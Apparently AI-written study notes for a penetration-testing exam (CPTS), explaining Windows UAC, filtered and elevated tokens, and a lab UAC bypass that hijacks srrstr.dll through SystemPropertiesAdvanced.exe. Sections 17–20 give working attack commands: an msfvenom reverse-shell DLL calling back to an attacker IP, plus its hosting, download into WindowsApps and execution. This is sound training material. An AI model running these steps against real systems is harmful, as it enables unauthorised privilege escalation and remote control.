This is a **very important Windows privilege-escalation topic** because UAC explains why having administrative group membership does **not necessarily mean your current process has full administrative privileges**.

The core idea:

```text
Administrator account
       ↓
UAC enabled
       ↓
Standard/filtered token by default
       ↓
Elevation required
       ↓
Elevated token
```

UAC is a **convenience/protection mechanism**, but the source emphasizes that it is **not considered a security boundary**.

---

# 1. What is UAC?

**User Account Control (UAC)** provides a consent mechanism for elevated activities.

Windows applications operate at different **integrity levels**.

A process running at a higher integrity level can perform operations that could compromise the system.

With UAC enabled, applications normally operate using the security context of a non-administrative token until an administrator explicitly authorizes elevation.

Think:

```text
                    UAC
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
 Standard token              Elevated token
 Medium integrity            High integrity
        │                         │
        ▼                         ▼
 Normal operations          Administrative operations
```

---

# 2. UAC Is NOT a Security Boundary

This is an important exam statement:

> **UAC is not considered a security boundary.**

Its purpose is to:

- Reduce accidental administrative changes
    
- Require confirmation for elevation
    
- Make privileged operations more deliberate
    
- Slow down certain attack paths
    

The source specifically says UAC may not stop an attacker from gaining privileges, but it can add an additional step and potentially make the activity noisier.

---

# 3. Integrity Levels

Windows processes have **integrity levels**.

The important conceptual levels are:

```text
Low
 ↓
Medium
 ↓
High
 ↓
System
```

A normal user process generally operates at a lower integrity level than an elevated administrator process.

For CPTS, remember:

```text
Medium Integrity
     ↓
UAC elevation
     ↓
High Integrity
```

---

# 4. Administrator Can Have Two Tokens

This is one of the most important UAC concepts.

With Admin Approval Mode enabled, an administrator account can have **two access tokens**:

```text
Administrator account
        │
        ├───────────────┐
        ▼               ▼
Filtered token      Elevated token
Medium integrity    High integrity
        │               │
        ▼               ▼
Normal cmd.exe       Elevated cmd.exe
```

The source uses the account:

```text
winlpe-ws03\sarah
```

and demonstrates that `sarah` belongs to Administrators but is currently using an unprivileged access token.

---

# 5. Check Current User

Command:

```cmd
whoami /user
```

Example:

```text
USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

This tells you the current account and its SID.

---

# 6. Check Administrator Group Membership

Next:

```cmd
net localgroup administrators
```

Example:

```text
Members
-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
```

Therefore:

```text
sarah ∈ Administrators
```

But that doesn't automatically mean the current `cmd.exe` is elevated.

This distinction is **critical**:

> **Group membership tells you what the account is allowed to have; the current token tells you what the current process actually has.**

---

# 7. Check Current Privileges

Run:

```cmd
whoami /priv
```

The source's initial output includes:

```text
SeShutdownPrivilege
SeChangeNotifyPrivilege
SeUndockPrivilege
SeIncreaseWorkingSetPrivilege
SeTimeZonePrivilege
```

but the powerful administrator privileges aren't present in the current context.

This indicates we're dealing with the **filtered/unprivileged token**.

---

# 8. Confirm UAC Is Enabled

Registry location:

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
```

Check:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

Example:

```text
EnableLUA    REG_DWORD    0x1
```

`0x1` means UAC is enabled.

### Memorize

```text
EnableLUA = 1
       ↓
UAC enabled
```

---

# 9. Check UAC Prompt Level

Command:

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

Example:

```text
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

The source identifies `0x5` as:

```text
Always notify
```

and notes that there are fewer UAC bypasses available at the highest UAC level.

---

# 10. Important UAC Registry Settings

The source lists **10 UAC Group Policy settings**.

Some of the most important ones for CPTS:

|Setting|Registry value|Source default|
|---|---|---|
|Admin Approval Mode for built-in Administrator|`FilterAdministratorToken`|Disabled|
|Admin elevation prompt behavior|`ConsentPromptBehaviorAdmin`|Prompt for consent|
|Standard-user prompt behavior|`ConsentPromptBehaviorUser`|Prompt for credentials|
|Detect application installations|`EnableInstallerDetection`|Enabled for home / Disabled enterprise|
|Only signed executables elevate|`ValidateAdminCodeSignatures`|Disabled|
|Secure UIAccess paths|`EnableSecureUIAPaths`|Enabled|
|Run all admins in Admin Approval Mode|`EnableLUA`|Enabled|
|Secure desktop for elevation|`PromptOnSecureDesktop`|Enabled|
|File/registry virtualization|`EnableVirtualization`|Enabled|

The complete table is in the source.

---

# 11. Check Windows Build

UAC bypasses are often **version/build dependent**.

Therefore, before attempting a specific UAC bypass, determine the Windows build.

PowerShell:

```powershell
[environment]::OSVersion.Version
```

Example:

```text
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

The source maps build:

```text
14393
```

to:

```text
Windows 10 1607
```

### CPTS rule

Never think:

```text
UAC bypass X = works on Windows
```

Think:

```text
UAC bypass X
      ↓
Affected builds?
      ↓
Patch status?
      ↓
UAC configuration?
      ↓
Applicable?
```

---

# 12. UACME

The source references **UACME**, which maintains information about UAC bypass techniques, including:

- Technique number
    
- Affected Windows builds
    
- Technique used
    
- Whether Microsoft patched it
    

The lab uses **technique 54**, which the source states works from Windows 10 build `14393`.

The important CPTS lesson is:

> **UAC bypass selection is heavily dependent on the target's Windows build.**

---

# 13. Auto-Elevated Windows Binaries

The technique discussed in the source targets:

```text
SystemPropertiesAdvanced.exe
```

Specifically, the **32-bit** version.

The concept is interesting because Windows contains trusted binaries that can automatically elevate without displaying the normal UAC consent prompt in certain circumstances.

The source explains that the 32-bit version attempts to load:

```text
srrstr.dll
```

which is associated with System Restore functionality.

---

# 14. DLL Search Order

This is another concept you've already encountered in Windows privilege escalation.

When Windows looks for a DLL, the source gives this search order:

```text
1. Directory from which application loaded
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Directories in PATH
```

This matters because if a trusted application tries to load a DLL that isn't found in its expected location, another writable location in the search path may potentially become relevant.

---

# 15. Examine `%PATH%`

Command:

```cmd
cmd /c echo %PATH%
```

Example:

```text
C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

The source highlights:

```text
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps
```

because it is inside the user's profile and writable by that user.

---

# 16. DLL Hijacking Concept

The source's attack idea is:

```text
SystemPropertiesAdvanced.exe
          ↓
Attempts to load srrstr.dll
          ↓
DLL not found in expected locations
          ↓
Windows searches PATH
          ↓
Writable WindowsApps directory
          ↓
Attacker-controlled srrstr.dll
          ↓
DLL loaded in elevated context
```

This is the core **DLL search-order hijacking + UAC bypass** concept.

![Image](https://images.openai.com/static-rsc-4/Eo6q8kkA3EG9WCAoPXa302oym_xQnnEumHvs4LiG7T_fpydj-L1cjft6xStL9Th217HOXV5fNGvM_1uYiXYk5u7iC6bBRMS_Im4q5v6fj0xR37wSF9l8Ll-9R3JHDNMY40KZDgm-YyVMnIt27u1EvPlefLacfWVv5m00j3Fk7_SrvF6jzBopXcSL7G4Qozv0?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/PhEgUljFqytvbEUW3vZO5nYDfDccNpIQbtuiTalqnZR33or5_S-lVFOfsKX5L8LvrSGO_4A7n4KfzhNsAQtt8yCyNzwAX-PB1VTjGImV8jnkpEqY5-S2JdsRF0fgRAqZZTqpsnHRQnC_vykO3AE8Q1SsaJsmKrSeyZar6vxR2-hPyc2tDsz5cC-_kDnhHqte?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ggG4uiwmGS8tBTi1XqsFlijHrJsUN3CWJQfKw81ulNnshjbdOUaOb_5XWXUmjbvnJPaKozhtNgSl7H99Ph4_XfX6lnQV0IE53wcf2FZrqy-vxSemiFTVY02mohbD2yjYUWflgCC-SlVPLvcBtWOmPp9hUy4aPBP3SX_Ky6e_VfkxKFhoZFG91IGTTDoESazM?purpose=fullsize)

---

# 17. Generating `srrstr.dll`

The source uses:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

This creates the DLL used in the lab.

Important architecture detail:

```text
arch: x86
```

because the targeted binary is the 32-bit executable.

---

# 18. Hosting the DLL

The source starts:

```bash
sudo python3 -m http.server 8080
```

Then downloads it to:

```text
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

using:

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

The lab then starts a listener on:

```text
8443
```

---

# 19. Test the DLL Without UAC Elevation

The source first executes the DLL using:

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

The resulting shell still has normal user privileges.

This is important because it establishes:

```text
DLL works
      ↓
But current execution context
      ↓
Still normal user
```

The source confirms with:

```cmd
whoami /priv
```

showing only the normal user's privileges.

---

# 20. Execute `SystemPropertiesAdvanced.exe`

Before proceeding, the source terminates previous `rundll32` processes:

```cmd
tasklist /svc | findstr "rundll32"
```

Then:

```cmd
taskkill /PID 7044 /F
taskkill /PID 6300 /F
taskkill /PID 5360 /F
```

After cleanup, the 32-bit executable is launched:

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

---

# 21. Why `SysWOW64`?

This is a classic Windows naming detail that can confuse people:

```text
C:\Windows\System32
```

contains the **64-bit system binaries** on a 64-bit Windows installation.

```text
C:\Windows\SysWOW64
```

contains the **32-bit system binaries**.

Therefore:

```text
SysWOW64\SystemPropertiesAdvanced.exe
```

is the 32-bit version targeted by the technique described in this lab.

---

# 22. Elevated Connection

The source receives another connection.

Initially:

```text
whoami
```

returns:

```text
winlpe-ws03\sarah
```

But now `whoami /priv` exposes a much larger set of privileges, including:

```text
SeSecurityPrivilege
SeTakeOwnershipPrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
...
```

Most are initially:

```text
Disabled
```

while:

```text
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
```

are enabled in the example.

The important point is that the process has obtained an **elevated administrator token**.

---

# 🔥 The Complete UAC Bypass Chain

Memorize the logic:

```text
             Administrator account
                     │
                     ▼
                 UAC enabled
                     │
                     ▼
             Filtered token
                     │
                     ▼
              Medium integrity
                     │
                     ▼
           Identify Windows build
                     │
                     ▼
            Find applicable UAC
                bypass technique
                     │
                     ▼
          Auto-elevated binary
                     │
                     ▼
             DLL search order
                     │
                     ▼
          Writable PATH directory
                     │
                     ▼
             Malicious DLL
                     │
                     ▼
          Elevated execution
                     │
                     ▼
             High-integrity token
```

---

# 🧠 CPTS Enumeration Workflow for UAC

When you suspect you're an administrator but aren't elevated:

### 1. Who am I?

```cmd
whoami /user
```

### 2. Am I an administrator?

```cmd
net localgroup administrators
```

### 3. What privileges does my current token have?

```cmd
whoami /priv
```

### 4. Is UAC enabled?

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

### 5. What is the UAC prompt configuration?

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### 6. What Windows build?

```powershell
[environment]::OSVersion.Version
```

### 7. Investigate applicable UAC bypasses

```text
Build
 ↓
Technique
 ↓
Patch status
 ↓
UAC configuration
 ↓
Applicability
```

---

# 🔥 CPTS Must-Know Commands

### Identity

```cmd
whoami /user
```

### Group membership

```cmd
net localgroup administrators
```

### Current privileges

```cmd
whoami /priv
```

### UAC enabled?

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```

### UAC administrator prompt level

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### Windows version/build

```powershell
[environment]::OSVersion.Version
```

### PATH

```cmd
cmd /c echo %PATH%
```

### Process enumeration

```cmd
tasklist /svc
```

### Terminate process

```cmd
taskkill /PID <PID> /F
```

---

# ⚠️ Important Distinctions

### UAC vs Administrator Group

```text
Administrator group membership
            ≠
Current elevated token
```

### UAC vs Security Boundary

```text
UAC
 ↓
Protection/convenience mechanism
 ↓
NOT a security boundary
```

### Privilege Assigned vs Enabled

```text
Privilege present in token
            ≠
Privilege currently enabled
```

### UAC bypasses vs Windows versions

```text
Technique
    ↓
Specific Windows build
    ↓
Patch state
    ↓
May or may not work
```

---

# 🎯 Final Mental Model

For CPTS, if you see:

```text
User is Administrator
BUT
Current shell isn't elevated
```

your thought process should be:

```text
Administrator membership?
        ↓
YES
        ↓
Current token filtered?
        ↓
YES
        ↓
UAC enabled?
        ↓
Check EnableLUA
        ↓
Determine Windows build
        ↓
Research applicable UAC bypass
        ↓
Check patch/configuration
        ↓
Attempt only the technique applicable
to that environment
```

### One-line memory trick

> **UAC doesn't remove administrator membership; it controls which token a process is using. For CPTS, distinguish the account's group membership from the current token, then identify the Windows build before considering a UAC bypass.**